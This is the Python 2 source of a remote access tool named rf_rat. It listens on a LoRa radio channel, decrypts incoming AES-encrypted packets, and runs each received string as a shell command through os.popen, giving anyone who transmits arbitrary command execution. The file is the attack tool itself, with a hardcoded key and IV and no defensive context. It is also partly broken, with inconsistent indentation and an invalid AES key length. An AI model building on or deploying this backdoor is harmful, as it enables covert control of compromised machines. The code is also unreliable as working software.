import PyLora
import time
import requests
from Crypto.Cipher import AES
import sys
import collections
import os
from threading import Thread, Lock
from subprocess import  Popen, PIPE
from signal import SIGINT, signal


class rf_rat():

        def __init__ (self, freq, bandwidth, key, iv):
		PyLora.init()
                PyLora.set_frequency(freq)
                PyLora.enable_crc()
                PyLora.set_bandwidth(bandwidth)
                PyLora.set_tx_power(1)
                self.cobj2 = AES.new(key, AES.MODE_CFB, iv)

        def receiver (self):
            PyLora.receive()   # put into receive mode
            if not PyLora.packet_available():
		PyLora.wait_for_packet()
		return ''
	    else: 	
	        PyLora.packet_available()
	    	PyLora.packet_rssi()
            	rssi = PyLora.packet_rssi()
	    	rec_decrypt = self.cobj2.decrypt(str(PyLora.receive_packet()))
		text = str(rec_decrypt)
		
		if text !=  '':
		   if text.startswith('000 '):
			text = text[::-1]
			text = text[4:]
			text = text[::-1]
			text = text[4:]
			return text
		   else:
			return ''
     	    	else:
			return ''

        def sender (self, tx_str):
                #self.tx_str2 = str(tx_str)
                internal_str = "000 " + tx_str + " 000" 
                self.ciphertext = self.cobj2.encrypt(internal_str)
                PyLora.send_packet(self.ciphertext)

	def rat_execute (self, command):
		
		try:
			print command
#			self.proc = Popen([command], stdout = PIPE, stderr = DN)
			output = os.popen(command).readlines()
		except OSError:
			sys.exit("bad fucking command")
		for line in output:
#		for line in proc.communicate()[0].split('\n'):
#			if len(line) == 0: continue
#			self.sender(line)
			print line
		return ''

if __name__ =="__main__":
	main_rf_rat = rf_rat(915000000, 500000, 'NOT-TODAY-BUTTHEAD', '1234567812345678') 
        DN = open(os.devnull, 'w')
	while True:
		final_out = main_rf_rat.receiver()
		if final_out != '':
			print final_out
			command_string = final_out
#		command_thread = Thread(target = main_rf_rat.rat_execute, args = (command_string, ))
#		command_thread.daemon = True
#		command_thread.start()
			main_rf_rat.rat_execute(command_string)							
